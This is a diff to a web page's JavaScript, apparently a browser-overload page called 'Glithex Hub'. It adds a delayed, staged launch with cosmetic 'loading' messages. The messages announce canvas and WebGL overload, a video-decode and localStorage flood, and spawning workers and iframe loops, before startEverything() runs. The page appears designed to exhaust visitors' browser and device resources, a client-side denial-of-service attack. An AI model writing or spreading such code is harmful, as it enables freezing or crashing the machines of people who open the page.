@@ -15,6 +15,27 @@ let canvasCount = 0;
 const log = document.getElementById('log');
 let isOverloading = false;
 
+function updateLog(message) {
+    log.innerText = message;
+}
+
+function delayAndStart() {
+    updateLog("Loading resources...");
+    setTimeout(() => {
+        updateLog("Initializing Canvas and WebGL overload...");
+        setTimeout(() => {
+            updateLog("Activating Video Decode and LocalStorage flood...");
+            setTimeout(() => {
+                updateLog("Spawning workers and iframe loops...");
+                setTimeout(() => {
+                    startEverything();
+                    updateLog("🚀 Glithex Hub Activated!");
+                }, 3000); // Delay before starting the final phase
+            }, 3000); // Delay before spawning workers and iframe loops
+        }, 3000); // Delay before video decode and localStorage flood
+    }, 3000); // Delay before initializing canvas and WebGL overload
+}
+
 function MainCanvas() {
     if (!isOverloading) return;
     for (let i = 0; i < 20; i++) {
@@ -112,7 +133,7 @@ function startEverything() {
     }, 500);
 }
 
-startEverything();
+delayAndStart();
 </script>
 </body>
 </html>
